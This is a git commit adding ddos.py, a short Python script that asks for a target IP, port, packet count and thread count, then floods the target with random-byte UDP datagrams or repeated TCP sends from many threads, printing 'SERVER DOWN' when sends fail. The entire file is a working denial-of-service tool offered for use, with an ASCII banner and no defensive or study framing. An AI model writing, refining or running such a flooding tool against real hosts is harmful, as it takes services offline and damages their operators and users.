a1a99b52b8ae3bd2355c550ee62633254ff52cb0
Rkayez <128169765+Rkayez@users.noreply.github.com>
2024-01-01 02:47:51 +0100

    Add files via upload

---
+++ ddos.py
@@ -0,0 +1,55 @@
+import random
+import socket
+import threading
+
+print("""
+
+
+▄▄▄ . ▌ ▐·       ▄▄·  ▄▄▄· ▄▄▄▄▄      ▄▄▄  
+▀▄.▀·▪█·█▌ ▄█▀▄ ▐█ ▌▪▐█ ▀█ •██   ▄█▀▄ ▀▄ █·
+▐▀▀▪▄▐█▐█•▐█▌.▐▌██ ▄▄▄█▀▀█  ▐█.▪▐█▌.▐▌▐▀▀▄ 
+▐█▄▄▌ ███ ▐█▌.▐▌▐███▌▐█ ▪▐▌ ▐█▌·▐█▌.▐▌▐█•█▌
+ ▀▀▀ . ▀   ▀█▄▀▪·▀▀▀  ▀  ▀  ▀▀▀  ▀█▄▀▪.▀  ▀
+
+
+""")
+ip= str(input(" IP : "))
+port= int(input(" Port : "))
+choice = str(input(" Are u Ready???? (y/n): "))
+times= int(input(" Packets : "))
+threads= int(input(" Threads : "))
+def run():
+	data = random._urandom(1024)
+	i = random.choice(("[-]","[•]","[×]"))
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+			addr = (str(ip),int(port))
+			for x in range(times):
+				s.sendto(data,addr)
+			print(i +" Sending Requests")
+		except:
+			print("[!] SERVER DOWN!!!")
+
+def run2():
+	data = random._urandom(16)
+	i = random.choice(("[+]","[#]","[-]"))
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+			s.connect((ip,port))
+			s.send(data)
+			for x in range(times):
+				s.send(data)
+			print(i +" Sending Requests")
+		except:
+			s.close()
+			print("[] SERVER DOWN")
+            
+for y in range(threads):
+	if choice == 'y':
+		th = threading.Thread(target = run)
+		th.start()
+	else:
+		th = threading.Thread(target = run2)
+		th.start()
